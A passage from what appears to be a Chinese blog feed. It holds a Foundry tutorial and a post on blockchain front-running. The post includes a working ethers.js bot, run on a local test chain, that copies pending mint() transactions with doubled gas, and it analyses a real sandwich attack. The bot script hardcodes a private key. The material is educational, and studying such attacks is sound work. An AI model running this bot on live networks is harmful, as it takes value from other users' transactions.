fffffffffffffffffffffffffffff16815260200190815260200160002060008282546105e49190610bcc565b9250508190555080600260008282546105fd9190610bcc565b92505081905550600073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040516106629190610b24565b60405180910390a350565b60006020528060005260406000206000915090505481565b6004805461069290610c88565b80601f01602080910402602001604051908101604052809291908181526020018280546106be90610c88565b801561070b5780601f106106e05761010080835404028352916020019161070b565b820191906000526020600020905b8154815290600101906020018083116106ee57829003601f168201915b505050505081565b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546107619190610b76565b92505081905550806002600082825461077a9190610b76565b925050819055503373ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040516107df9190610b24565b60405180910390a350565b6000816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461083a9190610bcc565b92505081905550816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461088f9190610b76565b925050819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040516108f39190610b24565b60405180910390a36001905092915050565b6001602052816000526040600020602052806000526040600020600091509150505481565b60008135905061093981610d2e565b92915050565b60008135905061094e81610d45565b92915050565b60006020828403121561096a57610969610d18565b5b60006109788482850161092a565b91505092915050565b6000806040838503121561099857610997610d18565b5b60006109a68582860161092a565b92505060206109b78582860161092a565b9150509250929050565b6000806000606084860312156109da576109d9610d18565b5b60006109e88682870161092a565b93505060206109f98682870161092a565b9250506040610a0a8682870161093f565b9150509250925092565b60008060408385031215610a2b57610a2a610d18565b5b6000610a398582860161092a565b9250506020610a4a8582860161093f565b9150509250929050565b600060208284031215610a6a57610a69610d18565b5b6000610a788482850161093f565b91505092915050565b610a8a81610c12565b82525050565b6000610a9b82610b5a565b610aa58185610b65565b9350610ab5818560208601610c55565b610abe81610d1d565b840191505092915050565b610ad281610c3e565b82525050565b610ae181610c48565b82525050565b6000602082019050610afc6000830184610a81565b92915050565b60006020820190508181036000830152610b1c8184610a90565b905092915050565b6000602082019050610b396000830184610ac9565b92915050565b6000602082019050610b546000830184610ad8565b92915050565b600081519050919050565b600082825260208201905092915050565b6000610b8182610c3e565b9150610b8c83610c3e565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115610bc157610bc0610cba565b5b828201905092915050565b6000610bd782610c3e565b9150610be283610c3e565b925082821015610bf557610bf4610cba565b5b828203905092915050565b6000610c0b82610c1e565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600060ff82169050919050565b60005b83811015610c73578082015181840152602081019050610c58565b83811115610c82576000848401525b50505050565b60006002820490506001821680610ca057607f821691505b60208210811415610cb457610cb3610ce9565b5b50919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b600080fd5b6000601f19601f8301169050919050565b610d3781610c00565b8114610d4257600080fd5b50565b610d4e81610c3e565b8114610d5957600080fd5b5056fea2646970667358221220430240f2b33f93c884b94998ebe80de680b44967c2812f7cc349d7fb925e3c5264736f6c6343000807003300000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000a434845434b4552433230000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005434845434b000000000000000000000000000000000000000000000000000000</span><br><span class="line">nonce                30</span><br><span class="line">r                    0xd32cfba9d9ecb3441761ae9b8d4670c5e18abc7aae3a6e7a09db6b2e45fb4c54</span><br><span class="line">s                    0x5688918c3fa834d2ec4fa24ff269a573f80a5dd25cb55fdb3d70f38ddede9101</span><br><span class="line">to</span><br><span class="line">transactionIndex     0</span><br><span class="line">v                    37</span><br><span class="line">value                0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 跟ethersjs中的 provider.getTransactionReceipt类似</span><br><span class="line">cast receipt &lt;HASH&gt; [FIELD] --rpc-url=$RPC</span><br><span class="line"></span><br><span class="line">#只获得 logs</span><br><span class="line">cast receipt &lt;HASH&gt; logs --rpc-url=$RPC</span><br></pre></td></tr></table></figure><p><img src="/image/Foundry.assets/image-20230202163000901.png" alt="image-20230202163000901"></p><h5 id="获取交易方法"><a href="#获取交易方法" class="headerlink" title="获取交易方法"></a>获取交易方法</h5><p>Cast 会从 <a href="https://sig.eth.samczsun.com./">Ethereum Signature Database</a> 解析对应的方法名称</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cast 4byte &lt;SELECTOR&gt; 解析交易的名称</span><br></pre></td></tr></table></figure><p><img src="/image/Foundry.assets/image-20230202163126740.png" alt="image-20230202163126740"></p><h5 id="交易签名"><a href="#交易签名" class="headerlink" title="交易签名"></a>交易签名</h5><p>使用 Keccak-256 能够计算出方法名，函数名为被调函数的Keccak-256哈希值的前4个字节。这允许EVM准确无误地识别被调函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cast sig &lt;SIG&gt;</span><br></pre></td></tr></table></figure><p><img src="/image/Foundry.assets/image-20230202163242425.png" alt="image-20230202163242425"></p><p>交易解码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 获得calldata</span><br><span class="line">cast tx 0xc0dd067932ced612c7833ba739c66ad573e76c4909c29be1b3bf7a3d9e0308a0 input --rpc-url=$RPC</span><br><span class="line"></span><br><span class="line"># 可以通过该方法decode交易的数据，类似etherscan中的decode方法</span><br><span class="line">cast pretty-calldata &lt;CALLDATA&gt;</span><br></pre></td></tr></table></figure><p><img src="/image/Foundry.assets/image-20230202163522646.png" alt="image-20230202163522646"></p><p><img src="/image/Foundry.assets/image-20230202163541195.png" alt="image-20230202163541195"></p><h5 id="模拟运行"><a href="#模拟运行" class="headerlink" title="模拟运行"></a>模拟运行</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Usage: cast run --rpc-url &lt;URL&gt; &lt;TXHASH&gt;</span><br><span class="line">cast run --rpc-url=http://127.0.0.1:7545 0xc0dd067932ced612c7833ba739c66ad573e76c4909c29be1b3bf7a3d9e0308a0</span><br></pre></td></tr></table></figure><p><img src="/image/Foundry.assets/image-20230202164048881.png" alt="image-20230202164048881"></p><h5 id="新建账户"><a href="#新建账户" class="headerlink" title="新建账户"></a>新建账户</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cast wallet new</span><br></pre></td></tr></table></figure><p><img src="/image/Foundry.assets/image-20230202164208435.png" alt="image-20230202164208435"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 新建一个keystore的账号，带有密码</span><br><span class="line">cast wallet new ./</span><br></pre></td></tr></table></figure><p><img src="/image/Foundry.assets/image-20230202164304809.png" alt="image-20230202164304809"></p><h5 id="账户签名"><a href="#账户签名" class="headerlink" title="账户签名"></a>账户签名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 两种方法都可以使用签名，第一种载入刚才生成的keystore私钥，第二种直接输入自己的私钥。</span><br><span class="line">cast wallet sign &lt;MESSAGE&gt; --keystore=&lt;PATH&gt; </span><br><span class="line">cast wallet sign &lt;MESSAGE&gt; -i</span><br></pre></td></tr></table></figure><h5 id="账户验证"><a href="#账户验证" class="headerlink" title="账户验证"></a>账户验证</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cast wallet verify --address &lt;ADDRESS&gt; &lt;MESSAGE&gt; &lt;SIGNATURE&gt; </span><br></pre></td></tr></table></figure><h5 id="获取合约"><a href="#获取合约" class="headerlink" title="获取合约"></a>获取合约</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cast etherscan-source &lt;contract address&gt;</span><br><span class="line"></span><br><span class="line">cast etherscan-source 0x0FA09c096C419C36c5F1E63542526350DAfeb931 --etherscan-api-key=&#x27;key&#x27;</span><br><span class="line">//下载合约</span><br><span class="line">cast etherscan-source 0x0FA09c096C419C36c5F1E63542526350DAfeb931 -d ./</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="调用合约"><a href="#调用合约" class="headerlink" title="调用合约"></a>调用合约</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#cast call [OPTIONS] [TO] [SIG] [ARGS]... [COMMAND] --rpc-url=$RPC</span><br></pre></td></tr></table></figure><p>调用 Counter 合约中的 <code>increment</code> 函数</p><p><code>cast call  0x0FA09c096C419C36c5F1E63542526350DAfeb931 &quot;increment()&quot;</code></p><h5 id="解码ABi"><a href="#解码ABi" class="headerlink" title="解码ABi"></a>解码ABi</h5><p>可以根据ABI反向解析出solidity代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># cast interface [OPTIONS] &lt;PATH_OR_ADDRESS&gt;</span><br><span class="line">cast interface ./abi</span><br></pre></td></tr></table></figure><h5 id="编码解码"><a href="#编码解码" class="headerlink" title="编码解码"></a>编码解码</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cast --to-hex </span><br><span class="line"></span><br><span class="line">cast --to-dec </span><br><span class="line"></span><br><span class="line">cast --to-unit </span><br><span class="line"></span><br><span class="line">cast --to-wei </span><br><span class="line"></span><br><span class="line">cast --to-rlp </span><br><span class="line"></span><br><span class="line">cast --from-rlp</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Anvil本地节点的使用"><a href="#Anvil本地节点的使用" class="headerlink" title="Anvil本地节点的使用"></a>Anvil本地节点的使用</h3><p>anvil 跟 hardhat 还有 truffle中的ganache都是一样的，是一个本地的eth节点，同样拥有各种fork的功能。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">anvil </span><br><span class="line">anvil --accounts=&lt;NUM&gt; --balance=&lt;NUM&gt; </span><br><span class="line">anvil --mnemonic=&lt;MNEMONIC&gt; </span><br><span class="line">anvil --fork-url=$RPC --fork-block-number=&lt;BLOCK&gt;</span><br></pre></td></tr></table></figure><ul><li><p>热更新</p><p><code>forge build -w </code></p></li><li><p>测试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 三个v会现实详细的log信息</span><br><span class="line">forge test -vvv</span><br><span class="line"># 热更新模式</span><br><span class="line">forge test -vvv -w</span><br><span class="line"></span><br><span class="line"># log打印 需要 - vv 2个v以上才可以</span><br></pre></td></tr></table></figure></li></ul><h5 id="console2-log-打印"><a href="#console2-log-打印" class="headerlink" title="console2.log()打印"></a>console2.log()打印</h5><p><img src="/image/Foundry.assets/image-20230202171948681.png" alt="image-20230202171948681"></p><h5 id="emit-log-打印"><a href="#emit-log-打印" class="headerlink" title="emit log 打印"></a>emit log 打印</h5><p><img src="/image/Foundry.assets/image-20230202172327860.png" alt="image-20230202172327860"></p><h5 id="改变状态"><a href="#改变状态" class="headerlink" title="改变状态"></a>改变状态</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function testCheatCode()public</span><br><span class="line">console2.Log(&quot;before:&quot;block.timestamp);</span><br><span class="line">vm.warp(1000);</span><br><span class="line">console2.log(&quot;after:&quot;block.timestamp);</span><br></pre></td></tr></table></figure><h5 id="改变msg-sender-【可以模拟管理员账户】"><a href="#改变msg-sender-【可以模拟管理员账户】" class="headerlink" title="改变msg.sender 【可以模拟管理员账户】"></a>改变msg.sender 【可以模拟管理员账户】</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 只有第一次有影响</span><br><span class="line">vm.prank(address)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 多次影响</span><br><span class="line">vm.startPrank(address)</span><br><span class="line">...code</span><br><span class="line">vm.stopPrank()</span><br></pre></td></tr></table></figure><h5 id="改变存储状态"><a href="#改变存储状态" class="headerlink" title="改变存储状态"></a>改变存储状态</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function testCheatCode()public&#123;</span><br><span class="line">console2.Log(&quot;before:&quot;alice.balance);</span><br><span class="line">vm.deal(alice,1 ether);</span><br><span class="line">console2.Log(&quot;after:&quot;alice.balance);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="测试一"><a href="#测试一" class="headerlink" title="测试一"></a>测试一</h4><p>安装插件： `</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm init -y</span><br><span class="line">npm i @openzeppelin/contracts </span><br><span class="line"></span><br><span class="line">安装完成之后需要配置foundry.toml方法，在libs中添加 node_modules文件夹。</span><br><span class="line">[profile.default]</span><br><span class="line">src = &#x27;src&#x27;</span><br><span class="line">out = &#x27;out&#x27;</span><br><span class="line">libs = [&#x27;lib&#x27;,&#x27;node_modules&#x27;]</span><br></pre></td></tr></table></figure><p>编写测试用例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: SEE LICENSE IN LICENSE</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../src/Counter.sol&quot;;</span><br><span class="line">// 导入IERC20的接口，通过该接口可以调用对应的方法</span><br><span class="line">import &#123;IERC20&#125; from &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract IERC20Test is Test &#123;</span><br><span class="line">  // 声明Counter合约对象变量</span><br><span class="line">  Counter public counter;</span><br><span class="line">  // 声明一个地址变量</span><br><span class="line">  address public alice;</span><br><span class="line">  // 声明一个msgSender</span><br><span class="line">  address public msgSender;</span><br><span class="line">  // 声明帮助合约函数</span><br><span class="line">  Helper public h;</span><br><span class="line"></span><br><span class="line">  //定义一个IERC20 合约对象</span><br><span class="line">  IERC20 public dai;</span><br><span class="line"></span><br><span class="line">  function setUp() public &#123;</span><br><span class="line">    // new测试合约对象</span><br><span class="line">    counter = new Counter();</span><br><span class="line">    // 调用对象方法</span><br><span class="line">    counter.setNumber(0);</span><br><span class="line">    // new helper对象</span><br><span class="line">    h = new Helper();</span><br><span class="line"></span><br><span class="line">    alice = address(10086);</span><br><span class="line">    console2.log(alice);</span><br><span class="line">    dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // 测试给合约地址转账</span><br><span class="line">  function testCheatCode() public &#123;</span><br><span class="line">    console2.log(&quot;before:&quot;, dai.balanceOf(alice));</span><br><span class="line">    deal(address(dai), alice,1 ether);</span><br><span class="line">    console2.log(&quot;after:&quot;, dai.balanceOf(alice));</span><br><span class="line">  &#125;</span><br><span class="line">  // 测试改变合约msg.sender</span><br><span class="line">  function testCheatAddress() public &#123;</span><br><span class="line">    console2.log(&quot;before:&quot;, h.whoCalled());</span><br><span class="line">    vm.prank(address(1));</span><br><span class="line">    console2.log(&quot;after:&quot;, h.whoCalled());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Helper &#123;</span><br><span class="line">  function whoCalled() public view returns (address) &#123;</span><br><span class="line">    return msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/image/Foundry.assets/image-20230202181052114.png" alt="image-20230202181052114"></p><h3 id="vm-sol"><a href="#vm-sol" class="headerlink" title="vm.sol"></a>vm.sol</h3><p><code>vm.sol</code> 中还有很多封装好的方法可以直接使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Sets the *next* call&#x27;s msg.sender to be the input address</span><br><span class="line">    function prank(address) external;</span><br><span class="line">    // Sets all subsequent calls&#x27; msg.sender to be the input address until `stopPrank` is called</span><br><span class="line">    function startPrank(address) external;</span><br><span class="line">    // Sets the *next* call&#x27;s msg.sender to be the input address, and the tx.origin to be the second input</span><br><span class="line">    function prank(address,address) external;</span><br><span class="line">    // Sets all subsequent calls&#x27; msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input</span><br><span class="line">    function startPrank(address,address) external;</span><br><span class="line">    // Resets subsequent calls&#x27; msg.sender to be `address(this)`</span><br><span class="line">    function stopPrank() external;</span><br><span class="line">    // Sets an address&#x27; balance, (who, newBalance)</span><br><span class="line">    function deal(address, uint256) external;</span><br><span class="line">    // Sets an address&#x27; code, (who, newCode)</span><br><span class="line">    function etch(address, bytes calldata) external;</span><br><span class="line">    // Expects an error on next call</span><br><span class="line">    function expectRevert(bytes calldata) external;</span><br><span class="line">    function expectRevert(bytes4) external;</span><br><span class="line">    function expectRevert() external;</span><br><span class="line">    // Records all storage reads and writes</span><br><span class="line">    function record() external;</span><br><span class="line">    // Gets all accessed reads and write slot from a recording session, for a given address</span><br><span class="line">    function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);</span><br></pre></td></tr></table></figure><h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forge script [OPTIONS] &lt;PATH&gt; [ARGS]...</span><br><span class="line">forge script script/Counter.s.sol:CounterScript</span><br></pre></td></tr></table></figure><p>指定方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forge script script/Counter.s.sol --sig=&quot;someFunction(uint256 x)&quot; 10</span><br></pre></td></tr></table></figure><h3 id="合约部署脚本"><a href="#合约部署脚本" class="headerlink" title="合约部署脚本"></a>合约部署脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Script.sol&quot;;</span><br><span class="line">// 引入合约</span><br><span class="line">import &quot;../src/Counter.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract CounterScript is Script &#123;</span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        console2.log(&quot;setup &quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function run() public &#123;</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">//生成合约对象</span><br><span class="line">        Counter c = new Counter();</span><br><span class="line"></span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>forge script script/deploy.sol  -vvvv</code></p><p><img src="/image/Foundry.assets/image-20230202191223610.png" alt="image-20230202191223610"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Foundry-介绍&quot;&gt;&lt;a href=&quot;#Foundry-介绍&quot; class=&quot;headerlink&quot; title=&quot;Foundry 介绍&quot;&gt;&lt;/a&gt;Foundry 介绍&lt;/h3&gt;&lt;p&gt;Foundry是 一个用 Rust编写的用于以太坊应用程序开发的极快、可移植</summary>
      
    
    
    
    <category term="智能合约 区块链" scheme="https://banana69.site/categories/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
  </entry>
  
  <entry>
    <title>抢先交易 Front-running</title>
    <link href="https://banana69.site/2023/01/17/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93/"/>
    <id>https://banana69.site/2023/01/17/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93/</id>
    <published>2023-01-17T14:12:01.000Z</published>
    <updated>2023-01-18T06:02:53.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="传统抢跑"><a href="#传统抢跑" class="headerlink" title="传统抢跑"></a>传统抢跑</h3><p>抢跑最初诞生于传统金融市场，是一场单纯为了利益的竞赛。在金融市场中，信息差催生了金融中介机构，他们可以通过最先了解某些行业信息并最先做出反应从而实现获利。这些攻击主要发生在股票市场交易和早期的域名注册。</p><h3 id="链上抢跑"><a href="#链上抢跑" class="headerlink" title="链上抢跑"></a>链上抢跑</h3><p>链上抢跑指的是搜索者或矿工通过调高<code>gas</code>或其他方法将自己的交易安插在其他交易之前，来攫取价值。在区块链中，矿工可以通过打包、排除或重新排序他们产生的区块中的交易来获得一定的利润，而<code>MEV</code>是衡量这种利润的指标。</p><p>在用户的交易被矿工打包进以太坊区块链之前，大部分交易会汇集到Mempool（交易内存池）中，矿工在这里寻找费用高的交易优先打包出块，实现利益最大化。通常来说，gas price越高的交易，越容易被打包。简单来说，Front-Running 是指在一笔正常交易等待打包的过程中，抢跑机器人通过设置更高 Gas 费用抢先完成攻击交易，以此攫取用户利益的攻击行为。而 Mempool 是一组已经广播到网络中并等待被打包进区块的以太坊交易，它是 Front-Running 可以实施的前提，抢跑机器人通过不断扫描 Mempool 中的交易，来分析发现可攻击的目标。</p><blockquote><p>MEV: 最大可提取价值</p></blockquote><h3 id="链上抢跑实践"><a href="#链上抢跑实践" class="headerlink" title="链上抢跑实践"></a>链上抢跑实践</h3><ul><li>使用 Foundry 的 anvil 搭建本地测试链</li><li>使用 etherJs 脚本监听 mempool 并进行抢跑</li><li>使用 remix 部署合约</li></ul><ol><li><p>启动 Foundry 本地测试链</p><p><code>anvil --chain-id 1234 -b 10</code></p><p>Chain id 为 1234 并且在每 10 秒产出一个区块。</p><p><img src="/image/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230117222113559.png" alt="image-20230117222113559"></p><p>测试合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">import &quot;@oppenzeppelin/contracts/token/ERC721/ERC721.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract FreeMint is ERC721 &#123;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line"></span><br><span class="line">    constructor() ERC721(&quot;FREE MINT NFT&quot;,&quot;FREEMINT&quot;)&#123;&#125;</span><br><span class="line"></span><br><span class="line">    //铸造函数</span><br><span class="line">    function mint() external &#123;</span><br><span class="line">        _mint(msg.sender, totalSupply);</span><br><span class="line">        totalSupply++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在 remix 中部署合约</p><p><img src="/image/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230117225843870.png" alt="image-20230117225843870"></p></li><li><p>部署 etherJs 抢跑脚本，在该脚本中监听了测试链<code>mempool</code>中的未决交易，筛选出调用了<code>mint()</code>的交易，然后复制它并调高<code>gas</code>进行抢跑。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ethers, utils &#125; <span class="keyword">from</span> <span class="string">&quot;ethers&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> provider = <span class="keyword">new</span> ethers.providers.WebSocketProvider(<span class="string">&quot;http://127.0.0.1:8545&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> network = provider.getNetwork()</span><br><span class="line">network.then(<span class="function"><span class="params">res</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">`[<span class="subst">$&#123;(<span class="keyword">new</span> <span class="built_in">Date</span>).toLocaleTimeString()&#125;</span>] 连接到 chain ID <span class="subst">$&#123;res.chainId&#125;</span>`</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建 interface 对象，用于解码交易详情</span></span><br><span class="line"><span class="keyword">const</span> iface = <span class="keyword">new</span> utils.Interface([</span><br><span class="line">    <span class="string">&quot;function mint() external&quot;</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建钱包，用于发送抢跑交易</span></span><br><span class="line"><span class="keyword">const</span> privateKey = <span class="string">&quot;0x2a871d0798f97d79848a013d4936a73bf4cc922c825d33c1cf7073dff6d409c6&quot;</span></span><br><span class="line"><span class="keyword">const</span> wallet = <span class="keyword">new</span> ethers.Wallet(privateKey, provider)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> main = <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">//监听pending的mint交易，获取交易详情并解码</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;\n. 监听pending交易，获取txHash，并输出交易详情。&quot;</span>)</span><br><span class="line">    provider.on(<span class="string">&quot;pending&quot;</span>, <span class="keyword">async</span> (txHash) =&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> tx = <span class="keyword">await</span> provider.getTransaction(txHash)</span><br><span class="line">        <span class="keyword">if</span> (txHash) &#123;</span><br><span class="line">            <span class="comment">//监听交易池中未打包的交易，过滤 pending.data</span></span><br><span class="line">            <span class="keyword">if</span> (tx.data.indexOf(iface.getSighash(<span class="string">&quot;mint&quot;</span>)) != -<span class="number">1</span> &amp;&amp; tx.from != wallet.address) &#123;</span><br><span class="line">                <span class="comment">//打印txHash</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`\n[<span class="subst">$&#123;(<span class="keyword">new</span> <span class="built_in">Date</span>).toLocaleTimeString()&#125;</span>] 监听 Pending 交易: <span class="subst">$&#123;txHash&#125;</span> \r`</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment">//打印解码的交易详情</span></span><br><span class="line">                <span class="keyword">let</span> parsedTx = iface.parseTransaction(tx)</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;pending交易详情解码：&quot;</span>)</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`name: <span class="subst">$&#123;parsedTx.name&#125;</span>`</span>)</span><br><span class="line">                <span class="comment">// Input data解码</span></span><br><span class="line">                <span class="comment">// console.log(&quot;raw transaction&quot;)</span></span><br><span class="line">                <span class="comment">// console.log(tx)</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">//构建抢跑 tx</span></span><br><span class="line">                <span class="keyword">const</span> txFrontrun = &#123;</span><br><span class="line">                    <span class="attr">to</span>: tx.to,</span><br><span class="line">                    <span class="attr">value</span>: tx.value,</span><br><span class="line">                    <span class="attr">maxPriorityFeePerGas</span>: tx.maxPriorityFeePerGas * <span class="number">2</span>,</span><br><span class="line">                    <span class="attr">maxFeePerGas</span>: tx.maxFeePerGas * <span class="number">2</span>,</span><br><span class="line">                    <span class="attr">gasLimit</span>: tx.gasLimit * <span class="number">2</span>,</span><br><span class="line">                    <span class="attr">data</span>: tx.data</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//发送抢跑交易</span></span><br><span class="line">                <span class="keyword">var</span> txResponse = <span class="keyword">await</span> wallet.sendTransaction(txFrontrun)</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`正在 frontrun 交易`</span>)</span><br><span class="line">                <span class="keyword">await</span> txResponse.wait()</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`frontrun 交易成功`</span>)</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`交易哈希为：<span class="subst">$&#123;txResponse.hash&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></li><li><p>调用 mint 函数，进行 NFT 铸造</p><p><img src="/image/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230117233952535.png" alt="image-20230117233952535"></p></li><li><p>脚本监听到交易并进行抢跑，在终端可以看到交易详情，在合约中可以调用<code>ownerOf()</code>函数查看 <code>tokenId</code> 为 1 的持有者是抢跑脚本中的钱包地址，则抢跑成功。</p><p><img src="/image/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230118001807115.png" alt="image-20230118001807115"></p><p><img src="/image/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230118001814266.png" alt="image-20230118001814266"></p><p><img src="/image/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230118001904634.png" alt="image-20230118001904634"></p></li></ol><h3 id="真实案例"><a href="#真实案例" class="headerlink" title="真实案例"></a>真实案例</h3><p><img src="/image/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230118002916893.png" alt="image-20230118002916893"></p><p>如上图，两笔攻击交易中间夹着一笔正常的交易，攻击流程为</p><ol><li>用户首先发起一笔正常交易，用 237000.705USDC 买入 DG，设置 Gas Price 为 40.5Gwei；</li><li>抢跑机器人检测到这笔有利可图的交易后，随即展开攻击，发起一笔买入交易，设定 GasPrice 为 49.9Gwei，凭借 Gas 竞争机制成功抢跑用户的正常交易；</li><li>与此同时，机器人发出另一笔卖出交易，设置 GasPrice 同样为 40.5Gwei，因为时间顺序的原因，紧贴着用户正常交易完成</li></ol><p>根据AMM机制，通过这次抢跑攻击，黑客赚取 16448.012-16310.3-15.2-10.61 = $111.9，这种两笔攻击交易夹着一笔正常交易的攻击，被形象的称为三明治攻击。</p><h4 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h4><p>现如今的主流 DEX 如 Uniswap 等，采用的都是 AMM （自动化做市商）机制，其价格遵循恒定乘积公式。例如，在 Uniswap 中建立一个 A 代币与 ETH 的流动池，A 数量为 1000，ETH 数量为 100，则两者数量乘积为 100000，当前 A 价格为 0.1ETH。当 Alice 试图用 10 个 ETH 来池子里购买 A 时，他所得到的 A 的数量 X，可以用下面的公式推导 